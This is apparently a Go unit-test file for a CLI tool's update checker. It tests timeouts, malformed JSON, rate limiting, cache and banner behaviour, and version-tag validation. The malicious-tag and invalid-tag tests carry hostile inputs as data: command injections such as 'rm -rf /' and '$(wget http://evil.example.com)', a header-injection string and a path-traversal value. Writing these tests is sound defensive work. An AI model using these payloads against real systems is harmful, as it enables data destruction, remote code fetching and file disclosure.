// Copyright 2026 Glassbox Users
// SPDX-License-Identifier: Apache-2.0

package updater

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// fakeServer returns a test HTTP server plus a convenience constructor for a
// Checker wired to it.  The caller must close the server after the test.
func fakeServer(t *testing.T, handler http.HandlerFunc) (*httptest.Server, func(ver, cacheDir string) *Checker) {
	t.Helper()
	srv := httptest.NewServer(handler)
	newChecker := func(ver, cacheDir string) *Checker {
		return newTestChecker(ver, cacheDir, srv.URL, srv.Client())
	}
	return srv, newChecker
}

// TestFetchLatestVersion_Timeout verifies that a server that never responds
// does not block the caller indefinitely – the HTTP client times out and
// fetchLatestVersion returns an error rather than hanging.
func TestFetchLatestVersion_Timeout(t *testing.T) {
	// Server that never writes a response
	ready := make(chan struct{})
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		<-ready // blocks until the test closes the channel
	}))
	t.Cleanup(func() {
		close(ready)
		srv.Close()
	})

	// Use a very short timeout so the test finishes quickly.
	shortTimeout := 100 * time.Millisecond
	hc := &http.Client{Timeout: shortTimeout}
	checker := newTestChecker("v1.0.0", t.TempDir(), srv.URL, hc)

	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()

	_, err := checker.fetchLatestVersion(ctx)
	assert.Error(t, err, "expected timeout error from hanging server")
}

// TestFetchLatestVersion_InvalidJSON verifies that a server returning garbled
// JSON is handled gracefully – the error is surfaced but does not panic.
func TestFetchLatestVersion_InvalidJSON(t *testing.T) {
	srv, newChecker := fakeServer(t, func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_, _ = w.Write([]byte(`{this is not valid json`))
	})
	defer srv.Close()

	checker := newChecker("v1.0.0", t.TempDir())
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	_, err := checker.fetchLatestVersion(ctx)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "malformed release metadata")
}

// TestFetchLatestVersion_EmptyTagName verifies that a well-formed JSON response
// with a missing tag_name is rejected rather than silently stored.
func TestFetchLatestVersion_EmptyTagName(t *testing.T) {
	srv, newChecker := fakeServer(t, func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(map[string]string{"tag_name": ""})
	})
	defer srv.Close()

	checker := newChecker("v1.0.0", t.TempDir())
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	_, err := checker.fetchLatestVersion(ctx)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "missing tag_name")
}

// TestFetchLatestVersion_MaliciousTag verifies that tag_name values containing
// shell metacharacters, URLs, or other unexpected content are rejected.
func TestFetchLatestVersion_MaliciousTag(t *testing.T) {
	maliciousTags := []string{
		"v1.0.0; rm -rf /",
		"$(wget http://evil.example.com)",
		"v1.0.0\nX-Injected: true",
		"../../etc/passwd",
		"v" + strings.Repeat("a", 200), // too long
	}

	for _, tag := range maliciousTags {
		tag := tag
		label := tag
		if len(label) > 30 {
			label = label[:30]
		}
		t.Run(label, func(t *testing.T) {
			srv, newChecker := fakeServer(t, func(w http.ResponseWriter, r *http.Request) {
				w.Header().Set("Content-Type", "application/json")
				payload, _ := json.Marshal(map[string]string{"tag_name": tag})
				_, _ = w.Write(payload)
			})
			defer srv.Close()

			checker := newChecker("v1.0.0", t.TempDir())
			ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
			defer cancel()

			_, err := checker.fetchLatestVersion(ctx)
			require.Error(t, err, "tag %q should be rejected", tag)
		})
	}
}

// TestDowngradeDoesNotNotify verifies that when the latest published version is
// older than the currently running version, no update banner is emitted.
func TestDowngradeDoesNotNotify(t *testing.T) {
	tmpDir := t.TempDir()
	cacheDir := filepath.Join(tmpDir, "glassbox")
	require.NoError(t, os.MkdirAll(cacheDir, 0o755))

	// Populate cache as if the server told us v0.5.0 is latest.
	cache := CacheData{
		LastCheck:     time.Now(),
		LatestVersion: "v0.5.0",
	}
	data, err := json.Marshal(cache)
	require.NoError(t, err)
	require.NoError(t, os.WriteFile(filepath.Join(cacheDir, "last_update_check"), data, 0o644))

	// Capture stderr to verify no banner is printed.
	origStderr := os.Stderr
	r, w, _ := os.Pipe()
	os.Stderr = w

	// Running version is v1.0.0 – newer than the cached latest v0.5.0.
	ShowBannerFromCacheWithCacheDir("v1.0.0", cacheDir)

	_ = w.Close()
	os.Stderr = origStderr

	var buf [1024]byte
	n, _ := r.Read(buf[:])
	assert.Empty(t, string(buf[:n]), "should not show downgrade notification")
}

// TestNonBlockingCheckForUpdates verifies that CheckForUpdates returns quickly
// even when the HTTP request would block, because the update is performed
// asynchronously and the cache gate prevents repeated calls.
func TestNonBlockingCheckForUpdates(t *testing.T) {
	// Seed a fresh cache so the shouldCheck gate returns false immediately.
	tmpDir := t.TempDir()
	cache := CacheData{
		LastCheck:     time.Now(),
		LatestVersion: "v1.0.0",
	}
	data, err := json.Marshal(cache)
	require.NoError(t, err)
	cacheFile := filepath.Join(tmpDir, "last_update_check")
	require.NoError(t, os.WriteFile(cacheFile, data, 0o644))

	checker := &Checker{
		currentVersion: "v1.0.0",
		cacheDir:       tmpDir,
	}

	start := time.Now()
	checker.CheckForUpdates()
	elapsed := time.Since(start)

	// Should return well within 1 second because the cache is fresh.
	assert.Less(t, elapsed, time.Second, "CheckForUpdates blocked longer than expected")
}

// TestHTTPServerErrorIsIgnored verifies that a 5xx response from the API does
// not surface as a user-visible error or panic.
func TestHTTPServerErrorIsIgnored(t *testing.T) {
	srv, newChecker := fakeServer(t, func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusInternalServerError)
	})
	defer srv.Close()

	checker := newChecker("v1.0.0", t.TempDir())
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	_, err := checker.fetchLatestVersion(ctx)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "500")
}

// TestHTTPRateLimitIsIgnored verifies that a 429 response does not cause a
// visible error – rate limiting is expected and should be silently skipped.
func TestHTTPRateLimitIsIgnored(t *testing.T) {
	srv, newChecker := fakeServer(t, func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusTooManyRequests)
	})
	defer srv.Close()

	checker := newChecker("v1.0.0", t.TempDir())
	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	_, err := checker.fetchLatestVersion(ctx)
	require.Error(t, err, "rate limit should result in an error from fetchLatestVersion")
	// The error must NOT propagate to CheckForUpdates – check that the full
	// flow swallows it silently.
	tmpDir := t.TempDir()
	var requestCount int32
	rateLimitSrv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		atomic.AddInt32(&requestCount, 1)
		w.WriteHeader(http.StatusTooManyRequests)
	}))
	defer rateLimitSrv.Close()

	silent := newTestChecker("v1.0.0", tmpDir, rateLimitSrv.URL, rateLimitSrv.Client())
	// CheckForUpdates must not panic or write to stderr on rate limit.
	origStderr := os.Stderr
	r, w2, _ := os.Pipe()
	os.Stderr = w2

	silent.CheckForUpdates()

	_ = w2.Close()
	os.Stderr = origStderr

	var buf [512]byte
	n, _ := r.Read(buf[:])
	assert.Empty(t, string(buf[:n]), "rate-limit response must not emit banner or error text")
}

// TestValidUpdateIsDetectedAndCached verifies the happy path: a valid newer
// release is fetched, stored in the cache, and shown as a banner on the next
// run via ShowBannerFromCacheWithCacheDir.
func TestValidUpdateIsDetectedAndCached(t *testing.T) {
	srv, newChecker := fakeServer(t, func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		_ = json.NewEncoder(w).Encode(GitHubRelease{TagName: "v2.0.0"})
	})
	defer srv.Close()

	cacheDir := t.TempDir()
	checker := newChecker("v1.0.0", cacheDir)

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()

	tag, err := checker.fetchLatestVersion(ctx)
	require.NoError(t, err)
	assert.Equal(t, "v2.0.0", tag)

	// Store in cache.
	require.NoError(t, checker.updateCache(tag))

	// Banner should appear.
	origStderr := os.Stderr
	r, w2, _ := os.Pipe()
	os.Stderr = w2

	ShowBannerFromCacheWithCacheDir("v1.0.0", cacheDir)

	_ = w2.Close()
	os.Stderr = origStderr

	var buf [1024]byte
	n, _ := r.Read(buf[:])
	output := string(buf[:n])
	assert.Contains(t, output, "v2.0.0")
	assert.Contains(t, output, "Upgrade available")
	// The notification MUST NOT contain executable code – it should only
	// reference the go install command as a human-readable string.
	assert.NotContains(t, output, "eval")
	assert.NotContains(t, output, "exec")
}

// TestIsValidVersionTag covers the tag validation helper directly.
func TestIsValidVersionTag(t *testing.T) {
	valid := []string{"v1.0.0", "1.0.0", "v2.3.4-rc1", "v1.0.0+build.1", "v10.20.30"}
	for _, tag := range valid {
		assert.True(t, isValidVersionTag(tag), "expected %q to be valid", tag)
	}

	invalid := []string{
		"",
		"v",
		"not-a-version",
		"v1.0.0; rm -rf /",
		"$(cmd)",
		strings.Repeat("v1.", 30),
		"v1.0.0\n",
	}
	for _, tag := range invalid {
		assert.False(t, isValidVersionTag(tag), "expected %q to be invalid", tag)
	}
}

